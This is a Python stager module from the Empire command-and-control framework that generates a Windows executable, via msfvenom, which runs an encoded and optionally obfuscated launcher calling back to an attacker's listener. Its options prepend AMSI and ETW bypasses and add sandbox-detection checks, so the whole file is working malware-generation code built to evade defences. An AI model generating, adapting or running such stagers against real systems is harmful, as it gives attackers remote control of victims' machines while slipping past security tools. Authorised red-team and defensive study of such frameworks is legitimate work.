from __future__ import print_function

import socket
import threading
import subprocess

from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Stage 0 - Cmd Exec',

            'Author': ['@Cx01N'],

            'Description': 'Generates windows command executable using msfvenom to act as a stage 0.',

            'Comments': ['']
        }

        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell', 'python'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': False,
                'Value': 'launcher.exe'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            },
            'Arch': {
                'Description': 'Architecture of the .dll to generate (x64 or x86).',
                'Required': True,
                'Value': 'x64',
                'SuggestedValues': ['x64', 'x86'],
                'Strict': True
            },
            'MSF_Format': {
                'Description': 'Format for compiling the msfvenom payload.',
                'Required': True,
                'Value': 'exe',
                'SuggestedValues': ['exe', 'hex', 'dword', 'java', 'python', 'ps1'],
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.main_menu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        safe_checks = self.options['SafeChecks']['Value']
        arch = self.options['Arch']['Value']
        msf_format = self.options['MSF_Format']['Value']

        encode = True

        invoke_obfuscation = False
        if obfuscate.lower() == "true":
            invoke_obfuscation = True

        # generate the launcher code
        self.launcher = self.main_menu.stagers.generate_launcher(listener_name, language=language, encode=encode,
                                                           obfuscate=invoke_obfuscation,
                                                           obfuscationCommand=obfuscate_command,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries, safeChecks=safe_checks,
                                                           bypasses=self.options['Bypasses']['Value'])

        if self.launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        shell = self.generate_shellcode(msf_format, arch, self.launcher)

        return shell

    def generate_shellcode(self, msf_format, arch, launcher):
        print("[*] Generating Shellcode %s" % arch)

        if arch == "x64":
            msf_payload = "windows/x64/exec"
        elif arch == "x86":
            msf_payload = "windows/exec"

        # generate the msfvenom command
        msf_command = f'msfvenom -p {msf_payload} -f {msf_format} CMD="{launcher}"'

        # Run the command and get output
        print(f"[*] MSF command -> {msf_command}")
        return subprocess.check_output(msf_command, shell=True)
